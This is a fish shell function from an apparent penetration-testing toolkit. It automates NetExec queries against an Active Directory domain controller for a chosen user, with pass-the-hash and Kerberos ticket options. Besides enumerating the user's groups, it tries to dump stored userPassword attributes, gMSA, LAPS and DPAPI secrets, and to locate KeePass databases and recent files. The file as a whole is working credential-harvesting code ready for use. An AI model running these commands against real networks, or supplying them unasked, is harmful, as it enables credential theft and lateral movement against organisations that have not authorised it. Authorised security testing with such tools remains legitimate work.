function _ezpz_enumuser
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    ezpz_banner enumuser

    # Usage message
    set usage "
Usage: ezpz enumuser -t <target> [-d <domain>] -u <user> [-p <password> | -H <hash>] [-k]

Enumerates a specific user's groups, rights, and potential access.

  -t, --target    Target Domain Controller IP or hostname (Required)
  -d, --domain    Domain for authentication (optional)
  -u, --user      Username to enumerate (Required)
  -p, --password  Password for authentication
  -H, --hash      NTLM hash for pass-the-hash authentication
  -k, --kerb      Use Kerberos authentication (requires a valid TGT)
  -h, --help      Show this help message

Examples:
ezpz enumuser -t 10.10.10.10 -u administrator -p password123
ezpz enumuser -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local
"

    # Check required tools
    set required_tools nxc
    for tool in $required_tools
        if not command -v $tool >/dev/null 2>&1
            ezpz_error "Required tool not found: $tool"
            return 1
        end
    end

    # Parse arguments
    argparse 't/target=' 'u/user=' 'p/password=' 'H/hash=' 'd/domain=' 'k/kerb' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    # Check required arguments
    if not set -q _flag_target
        ezpz_error "Missing required argument: -t/--target"
        echo $usage
        return 1
    end

    if not set -q _flag_user
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end

    # Set variables
    set target $_flag_target
    set user $_flag_user

    # Kerberos ccache principals are matched by bare username + -d domain.
    set -l bare_user $user
    if string match -q '*\\*' $bare_user
        set bare_user (string split '\\' $bare_user)[2]
    end
    if string match -q '*@*' $bare_user
        set bare_user (string split '@' $bare_user)[1]
    end
    set user $bare_user

    # Extract DC FQDN from /etc/hosts if needed for Kerberos
    set dc_fqdn ""
    if set -q _flag_kerb
        set dc_fqdn (ezpz_dc_fqdn $target)
        if test -z "$dc_fqdn"
            set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
        end
        if test -n "$dc_fqdn"
            # Use FQDN instead of IP for Kerberos
            set target $dc_fqdn
        else
            ezpz_warn "DC FQDN not found in /etc/hosts for $_flag_target. Kerberos may fail."
        end
        
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo systemctl stop systemd-timesyncd
            sudo ntpdate -u $_flag_target >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Build nxc authentication arguments
    set nxc_auth $target
    if set -q _flag_kerb
        set -a nxc_auth -u "$user"
        if set -q _flag_domain
            set -a nxc_auth -d "$_flag_domain"
        end
    else if set -q _flag_domain
        set -a nxc_auth -u "$_flag_domain\\$user"
    else
        set -a nxc_auth -u "$user"
    end

    # Add authentication method
    if set -q _flag_password
        set -a nxc_auth -p "$_flag_password"
    else if set -q _flag_hash
        set -a nxc_auth -H "$_flag_hash"
    end

    if set -q _flag_kerb
        ezpz_kerberos_check ldap; or return 1
        set -a nxc_auth -k
        if set -q KRB5CCNAME
            set -a nxc_auth --use-kcache
            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
        end
    end




    ezpz_title "Starting user enumeration for '$user' on $target..."

    ezpz_header "Enumerating '$user' account details"
    ezpz_cmd "nxc ldap $nxc_auth -M whoami -o USER=\"$user\""
    ezpz_spin timeout 60 nxc ldap $nxc_auth -M whoami -o USER="$user" \
        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
        | grep -aiE '^(Name|Description|sAMAccountName|Enabled|Password Never Expires|Last logon|Password Last Set|Bad Password Count|Distinguished Name|Member of|User SID):'
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Enumerate user groups
    ezpz_header "Enumerating '$user' groups"
    ezpz_cmd "nxc ldap $nxc_auth -M groupmembership -o USER=\"$user\""
    ezpz_spin timeout 60 nxc ldap $nxc_auth -M groupmembership -o USER="$user" | tail -n +4 | tr -s " " | cut -d " " -f 5-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    ezpz_header "Searching for userPassword attribute"
    ezpz_cmd "nxc ldap $nxc_auth -M get-userPassword"
    ezpz_spin timeout 60 nxc ldap $nxc_auth -M get-userPassword \
        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
        | grep -avE '^\[|^$'
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    ezpz_header "Searching for unixUserPassword attribute"
    ezpz_cmd "nxc ldap $nxc_auth -M get-unixUserPassword"
    ezpz_spin timeout 60 nxc ldap $nxc_auth -M get-unixUserPassword \
        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
        | grep -avE '^\[|^$'
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Try to dump gMSA passwords
    ezpz_header "Trying to dump gMSA passwords with user's rights"
    ezpz_cmd "nxc ldap $nxc_auth --gmsa"
    ezpz_spin timeout 60 nxc ldap $nxc_auth --gmsa | grep -aoE "Account:.*" --color=never
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Try to dump LAPS passwords
    ezpz_header "Trying to dump LAPS passwords with user's rights"
    ezpz_cmd "nxc ldap $nxc_auth -M laps"
    ezpz_spin timeout 60 nxc ldap $nxc_auth -M laps | tail -n +4 | tr -s " " | cut -d " " -f 6-
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping LDAP LAPS."
    end
    
    ezpz_cmd "nxc smb $nxc_auth --laps --dpapi"
    set -l dpapi_tmp (mktemp)
    ezpz_spin_capture $dpapi_tmp timeout 60 nxc smb $nxc_auth --laps --dpapi
    set -l dpapi_rc $status
    # Keep only actual secrets/errors; nxc's DPAPI preamble is noise.
    set -l dpapi_lines (tr -d '\0' < $dpapi_tmp \
        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//; s/^\[[!+*?-]\][[:space:]]*//' \
        | grep -aE 'Domain:|^Dumped [0-9]+ DPAPI secrets|No result|No secrets found' \
        | sort -u)
    if test $dpapi_rc -eq 124
        ezpz_warn "Operation timed out. Skipping SMB LAPS."
    else if test -n "$dpapi_lines"
        printf '  %s\n' $dpapi_lines
    else
        ezpz_info "No LAPS or DPAPI results found."
    end
    rm -f $dpapi_tmp

    # Try to find KeePass files
    ezpz_header "Trying to find KeePass files readable by user"
    ezpz_cmd "nxc smb $nxc_auth -M keepass_discover"
    ezpz_spin timeout 60 nxc smb $nxc_auth -M keepass_discover | grep -aoE "Found .*" --color=never
    if test $pipestatus[1] -eq 124
        ezpz_warn "Operation timed out. Skipping."
    end

    # Try to find Recent files
    ezpz_header "Trying to enumerate Recent Files"
    ezpz_cmd "nxc smb $nxc_auth -M recent_files"
    set -l recent_tmp (mktemp)
    ezpz_spin_capture $recent_tmp timeout 60 nxc smb $nxc_auth -M recent_files
    set -l recent_rc $status
    # The module can dump an impacket traceback when a directory is unreadable.
    # Keep only Windows paths that look like actual results.
    set -l recent_lines (tr -d '\0' < $recent_tmp \
        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//; s/^[[:space:]]+//' \
        | grep -aE '^[A-Za-z]:[\\\\]' \
        | sed 's/[[:space:]]*$//' \
        | sort -u)
    if test $recent_rc -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -n "$recent_lines"
        printf '  %s\n' $recent_lines
    else
        ezpz_info "No recent files found."
    end
    rm -f $recent_tmp

    ezpz_success "Done."
end